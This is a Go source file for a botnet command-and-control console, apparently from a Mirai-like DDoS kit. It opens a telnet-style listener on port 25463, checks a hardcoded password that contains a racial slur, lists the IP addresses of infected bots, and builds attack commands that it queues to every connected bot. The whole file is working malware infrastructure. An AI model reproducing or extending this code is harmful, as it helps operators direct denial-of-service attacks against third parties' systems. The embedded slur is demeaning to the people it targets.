package main

import (
	"fmt"
	"net"
	"time"
)

func Serve() {
	listen, err := net.Listen("tcp", ":25463")
	if err != nil {
		return
	}

	for {
		accept, err := listen.Accept()
		if err != nil {
			continue
		}

		go Handle(accept)
	}
}

func Handle(conn net.Conn) {
	defer conn.Close()

	conn.Write([]byte("\033[?1049h"))
	conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	line, err := ReadLine(conn, "k> ", false)
	if err != nil {
		return
	}

	if line != "youaskidnigga123" {
		return
	}

	conn.Write([]byte("\x1bc"))
	conn.Write([]byte("OwO\r\n"))

	go func() {
		for {
			if _, err := conn.Write([]byte(fmt.Sprintf("\033]0;%d\007", clientList.Count()))); err != nil {
				conn.Close()
				break
			}
			time.Sleep(time.Second)
		}
	}()

	for {
		cmd, err := ReadLine(conn, "# ", false)
		if err != nil {
			return
		}

		if cmd == "stats" {
			m := clientList.clients
			for _, v := range m {
				if v.source == "unicorn" {
					continue
				}

				conn.Write([]byte(fmt.Sprintf("%s\t\t%s\r\n", v.conn.RemoteAddr().String(), v.source)))
			}
			continue
		}

		if cmd == "bots" {
			m := clientList.Distribution()
			for k, v := range m {
				conn.Write([]byte(fmt.Sprintf("%s\t%d\r\n", k, v)))
			}
			continue
		}

		atk, err := NewAttack(cmd, true, true)
		if err != nil {
			conn.Write([]byte(err.Error() + "\r\n"))
			continue
		}

		buf, err := atk.Build()
		if err != nil {
			conn.Write([]byte(err.Error() + "\r\n"))
			continue
		}

		clientList.QueueBuf(buf, -1, "")
		conn.Write([]byte(fmt.Sprintf("Sent %d\r\n", clientList.Count())))
	}
}

func ReadLine(conn net.Conn, prompt string, masked bool) (string, error) {
	buf := make([]byte, 2048)
	pos := 0

	if len(prompt) >= 1 {
		conn.Write([]byte(prompt))
	}

	for {
		n, err := conn.Read(buf[pos : pos+1])
		if err != nil || n != 1 {
			return "", err
		}
		switch buf[pos] {
		case 0xFF:
			n, err := conn.Read(buf[pos : pos+2])
			if err != nil || n != 2 {
				return "", err
			}
			pos--
		case 0x7F, 0x08:
			if pos > 0 {
				conn.Write([]byte("\b \b"))
				pos--
			}
			pos--
		case 0x0D, 0x09:
			pos--
		case 0x0A, 0x00:
			conn.Write([]byte("\r\n"))
			return string(buf[:pos]), nil
		case 0x03:
			conn.Write([]byte("^C\r\n"))
			return "", nil
		default:
			if buf[pos] == 0x1B {
				buf[pos] = '^'
				conn.Write([]byte(string(buf[pos])))
				pos++
				buf[pos] = '['
				conn.Write([]byte(string(buf[pos])))
			} else if masked {
				conn.Write([]byte("*"))
			} else {
				conn.Write([]byte(string(buf[pos])))
			}
		}
		pos++
	}
}
